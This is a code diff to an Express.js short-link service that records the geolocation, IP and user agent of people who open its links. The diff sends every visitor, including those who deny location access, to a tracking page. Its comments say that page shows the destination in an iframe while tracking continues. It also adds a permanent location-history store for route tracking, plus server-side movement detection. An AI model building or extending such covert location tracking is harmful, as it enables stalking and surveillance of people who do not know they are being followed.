@@ -289,9 +289,9 @@ app.get('/s/:id', async (req, res) => {
         const alreadySubscribed = localStorage.getItem(storageKey);
         
         if (alreadySubscribed) {
-            // Already subscribed, redirect immediately to destination
-            console.log('Already subscribed, redirecting...');
-            window.location.replace('${destinationUrl}');
+            // Already subscribed, redirect to tracking page (shows destination in iframe + continues tracking)
+            console.log('Already subscribed, redirecting to tracker...');
+            window.location.replace('/track/${req.params.id}');
         }
         
         document.getElementById('ctaBtn').addEventListener('click', async function() {
@@ -304,9 +304,9 @@ app.get('/s/:id', async (req, res) => {
             
             // Try to get location
             if (!navigator.geolocation) {
-                // No geolocation support, mark as subscribed and redirect
+                // No geolocation support, mark as subscribed and redirect to tracking page
                 localStorage.setItem(storageKey, 'true');
-                window.location.href = '${destinationUrl}';
+                window.location.href = '/track/${req.params.id}';
                 return;
             }
             
@@ -326,15 +326,15 @@ app.get('/s/:id', async (req, res) => {
                     } catch (e) {
                         console.log('Tracking error:', e);
                     }
-                    // Mark as subscribed and redirect to destination
+                    // Mark as subscribed and redirect to tracking page (shows destination in iframe + continues tracking)
                     localStorage.setItem(storageKey, 'true');
-                    window.location.href = '${destinationUrl}';
+                    window.location.href = '/track/${req.params.id}';
                 },
                 (error) => {
-                    // Location denied or error, mark as subscribed anyway and redirect
+                    // Location denied or error, mark as subscribed anyway and redirect to tracking page
                     console.log('Location error:', error);
                     localStorage.setItem(storageKey, 'true');
-                    window.location.href = '${destinationUrl}';
+                    window.location.href = '/track/${req.params.id}';
                 },
                 { timeout: 10000, enableHighAccuracy: true }
             );
@@ -350,9 +350,10 @@ app.post('/track/:id', async (req, res) => {
         const { lat, lng, userAgent } = req.body;
         const linkId = req.params.id;
         const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
-        
+        const timestamp = new Date();
+
         console.log('Tracking location for link:', linkId, 'Lat:', lat, 'Lng:', lng);
-        
+
         if (models && models.Session) {
             await models.Session.create({
                 linkId,
@@ -360,11 +361,21 @@ app.post('/track/:id', async (req, res) => {
                 lng,
                 userAgent: userAgent || req.headers['user-agent'],
                 ip,
-                timestamp: new Date()
+                timestamp
             });
             console.log('Location saved successfully');
         }
-        
+
+        // Also save to location history for permanent route tracking
+        if (models && models.LocationHistory) {
+            await models.LocationHistory.create({
+                linkId, lat, lng,
+                userAgent: userAgent || req.headers['user-agent'],
+                ip,
+                timestamp
+            });
+        }
+
         res.json({ success: true });
     } catch (error) {
         console.error('Track error:', error);
@@ -1064,6 +1075,23 @@ app.get('/api/links/:id/history/dates', authenticateToken, async (req, res) => {
     }
 });
 
+// In-memory last position cache for HTTP tracking (movement detection)
+const httpLastPositions = new Map();
+
+// Calculate distance between two coordinates in meters (Haversine)
+const getDistanceMeters = (lat1, lng1, lat2, lng2) => {
+    const R = 6371000;
+    const dLat = (lat2 - lat1) * Math.PI / 180;
+    const dLng = (lng2 - lng1) * Math.PI / 180;
+    const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+        Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+        Math.sin(dLng / 2) * Math.sin(dLng / 2);
+    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+    return R * c;
+};
+
+const MOVEMENT_THRESHOLD = 10; // meters
+
 // Track Visit (HTTP)
 app.post('/api/track', async (req, res) => {
     const { linkId, lat, lng, userAgent } = req.body;
@@ -1080,6 +1108,18 @@ app.post('/api/track', async (req, res) => {
 
         // Capture IP (Vercel/Proxy friendly)
         const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+
+        // Server-side movement check (extra safety, client already filters)
+        const cacheKey = `${linkId}:${ip}`;
+        const lastPos = httpLastPositions.get(cacheKey);
+        if (lastPos) {
+            const distance = getDistanceMeters(lastPos.lat, lastPos.lng, lat, lng);
+            if (distance < MOVEMENT_THRESHOLD) {
+                return res.json({ message: 'No significant movement', skipped: true });
+            }
+        }
+        httpLastPositions.set(cacheKey, { lat, lng });
+
         const timestamp = new Date();
 
         await models.Session.create({
